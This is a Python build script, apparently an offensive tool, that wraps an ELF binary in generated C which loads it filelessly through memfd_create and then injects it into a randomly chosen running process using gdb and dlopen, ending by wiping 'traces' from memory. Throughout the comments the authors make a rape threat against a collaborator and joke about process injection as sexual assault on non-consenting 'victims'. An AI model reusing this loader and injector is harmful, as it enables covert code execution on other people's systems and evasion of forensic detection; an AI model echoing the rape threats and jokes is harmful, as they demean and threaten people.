#!/usr/bin/env python3

# humzak711 if you change my comments to be more "professional" I will r*** you mark my words
# ^ Ethan we will end up canceled mate

import sys
import os
import subprocess

def generate_source_so(so_path: str, output_path: str) -> None:
    # read the shared object file
    with open(so_path, 'rb') as so_file:
        so_data: bytes = so_file.read()

    # create the C source code that will have the shared object n give it a nice kiss :p
    c_code: str = f"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <unistd.h>
#include <dlfcn.h>
#include <signal.h>
#include <sys/wait.h>

// function prototype for memfd_create
int memfd_create(const char *name, unsigned int flags);

// zero out memory so no one eats it
void secure_zero(void *ptr, size_t size) {{
    volatile unsigned char *p = ptr;
    while (size--) {{
        *p++ = 0; // spam memory w so many 0s it cries and gets overwritten
    }}
}}

// embedded shared object data that got kissed goodnight
unsigned char so_data[] = {{
    {', '.join(f'0x{byte:02x}' for byte in so_data)}
}};
size_t so_data_size = sizeof(so_data); // fatness of the embedded data

// load the cute shared object from memory
void* load_embedded_so() {{
    // create a memory file descriptor
    int fd = memfd_create("embedded_so", 0);
    if (fd == -1) {{
        perror("memfd_create");
        return NULL;
    }}

    // write the embedded .so data to the memory file descriptor
    if (write(fd, so_data, so_data_size) != so_data_size) {{
        perror("write");
        close(fd);
        return NULL;
    }}

    lseek(fd, 0, SEEK_SET); // reset file offset

    // make the path to the memory file descriptor
    char path[256];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);

    // load the shared object
    void *handle = dlopen(path, RTLD_NOW | RTLD_GLOBAL);
    if (!handle) {{
        fprintf(stderr, "Error loading .so: %s\\n", dlerror());
        close(fd);
        return NULL;
    }}

    close(fd);
    return handle;
}}

// oh hey there reading the src, heres two kisses to keep you going xoxo

// find a suitable process to get victimised
pid_t get_injectable_pid() {{
    DIR *dir = opendir("/proc");
    if (dir == NULL) {{
        fprintf(stderr, "Error opening /proc directory: %s\\n", strerror(errno)); // fuck
        return -1;
    }}

    struct dirent *entry;
    pid_t pids[1000]; 
    int count = 0;

    // sniff through the /proc directory for valid PIDs
    while ((entry = readdir(dir)) != NULL && count < 1000) {{
        if (entry->d_type == DT_DIR) {{
            pid_t pid = atoi(entry->d_name);
            if (pid > 0 && pid != getpid() && pid != 1) {{
                char path[256];
                snprintf(path, sizeof(path), "/proc/%d/exe", pid);
                if (access(path, X_OK) == 0) {{
                    pids[count++] = pid; // snatch valid PIDs yumyum
                }}
            }}
        }}
    }}

    closedir(dir);

    // return a random PID if any were found
    if (count > 0) {{
        return pids[rand() % count];
    }}

    return -1; // no suitable victim (process) found
}}

// another kiss for you x

// inject the shared object into the target process
int inject_into_process(pid_t pid, const char *path) {{
    char command[256];
    snprintf(command, sizeof(command), "gdb -p %d -batch -ex 'call dlopen(\\"%s\\", 2)' > /dev/null 2>&1", pid, path);
    return system(command); // execute the command :o
}}

int main() {{
    // get a suitable process to inject into
    pid_t pid = get_injectable_pid();
    if (pid == -1) {{
        fprintf(stderr, "No suitable process found for injection\\n"); // :(
        return 1;
    }}

    printf("Injecting into process %d\\n", pid);

    // prep path for the shared object
    char path[256];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", memfd_create("embedded_so", 0));

    // attempt injection with a maximum of 5 tries because more than 5 we cant argue it consented
    int max_attempts = 5;
    int attempt;
    for (attempt = 0; attempt < max_attempts; attempt++) {{
        // get a new PID for each attempt
        pid_t new_pid = get_injectable_pid();
        if (new_pid == -1) {{
            fprintf(stderr, "No suitable process found for injection on attempt %d\\n", attempt + 1); // she had pepper spray bro!
            return 1; // run away if no suitable victim is found
        }}

        if (inject_into_process(new_pid, path) == 0) {{
            printf("Injection succeeded.\\n"); // niceeeee, p.s another two kisses for you xx
            break; // exit on success otherwise we will be serial injectors and will break shit
        }} else {{
            printf("Injection attempt %d failed. Retrying...\\n", attempt + 1);
        }}
    }}

    // check if all victims got away
    if (attempt == max_attempts) {{
        fprintf(stderr, "All injection attempts failed. Cleaning up and exiting.\\n"); // :(
        return 1;
    }}

    // load the embedded shared object
    void *handle = load_embedded_so();
    if (!handle) {{
        fprintf(stderr, "Failed to load the embedded shared object.\\n"); // fix your fucking .so
        return 1;
    }}
    printf("Shared object loaded successfully.\\n"); // nice

    // clean up our evid.. mess.
    
    printf("Attempting to clean memory\\n");
    dlclose(handle);

    // wipe the embedded data from memory
    secure_zero(so_data, so_data_size);
    printf("Traces wiped from memory\\n");

    // exit the injected victim
    printf("All operations success, exiting\\n");
    exit(0);
}}
"""

    # write the generated C code to the output file
    with open(output_path, 'w') as output_file:
        output_file.write(c_code)

    print(f"Generated source file: {output_path}") # confirm we made the baby

# Fixed your shit builder xxx 
def generate_source_exe(exe_path: str, output_path: str) -> None:
    # Read the executable file
    with open(exe_path, 'rb') as exe_file:
        exe_data: bytes = exe_file.read()
    c_code: str = f"""
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

unsigned char exe_data[] = {{
    {', '.join(f'0x{byte:02x}' for byte in exe_data)}
}};
size_t exe_data_size = sizeof(exe_data); 

// Do a reflective ELF injection to load in the executable ELF into memory
__attribute__((constructor)) void reflective_ELF_injection(void) {{

    int fd  = memfd_create("reflective_inj", 0);
    if (fd == -1) {{
        perror("memfd_create");
        return;
    }}

    write(fd, exe_data, exe_data_size);

    char *const argv[] = {{NULL}};
    char *const envp[] = {{NULL}};
    if (fexecve(fd, argv, envp) == -1) {{
        perror("fexecve");
        return;
    }}
    close(fd);
}}
"""
    # write the generated C code to a temporary file
    tmp_file: str = f'exe_tmp.c'
    with open(tmp_file, 'w') as output_file:
        output_file.write(c_code)

    # Generate the temporary .so
    tmp_so_file: str = f'exe_tmp.so'
    compile_cmd: str = f"gcc -shared -fPIC -o {tmp_so_file} {tmp_file}"
    result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        os.unlink(tmp_file)
        print("Compilation failed:")
        print(result.stderr) # print error output
        sys.exit(1)

    # Pack the .so
    generate_source_so(tmp_so_file, output_path)

    # Delete the temporary files
    os.unlink(tmp_file)
    os.unlink(tmp_so_file)

# Executes file -b to determine the filetype information of the file
def get_ELF_type(filepath: str) -> str | bool:
    try:
        output: bytes = subprocess.check_output(["file", "-b", filepath], stderr=subprocess.DEVNULL)
        if b"shared object" in output: 
            return "so"
        if b"executable" in output: 
            return "exe"
        return False
    except subprocess.CalledProcessError:
        return False
    
def main():
    
    # make sure the correct number of arguments are provided, learn to fucking type
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ELF_path> <output_executable_filepath>")
        sys.exit(1)

    ELF_path: str = sys.argv[1] # path to the ELF
    output_executable: str = sys.argv[2] # output executable name
    temp_source: str = "temp_source.c" # temp src file
    
    # really basic input validation for the elf file
    if not os.path.isfile(ELF_path):
        print(f"Error: The specified ELF file does not exist: {ELF_path}")
        sys.exit(1)

    ELF_type: str = get_ELF_type(ELF_path)
    if ELF_type == False:
        print("Error: The specified file is not an executable or shared object ELF file.")
        sys.exit(1)

    # gen the C source code
    match (ELF_type):
        case "so":
            generate_source_so(ELF_path, temp_source)
        case "exe":
            generate_source_exe(ELF_path, temp_source)

    # compile the generated C code
    compile_cmd: str = f"gcc -o {output_executable} {temp_source} -ldl"
    result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
    
    # check if the compilation was successful
    if result.returncode != 0:
        print("Compilation failed:")
        print(result.stderr) # print error output
        os.unlink(temp_source) # remove temp file because who likes clutter
        sys.exit(1)

    os.unlink(temp_source) # clean up temp file
    print(f"Compiled executable: {output_executable}") # confirm successful baby making

if __name__ == "__main__":
    main() # one final bunch of kisses xoxoxoxoxo
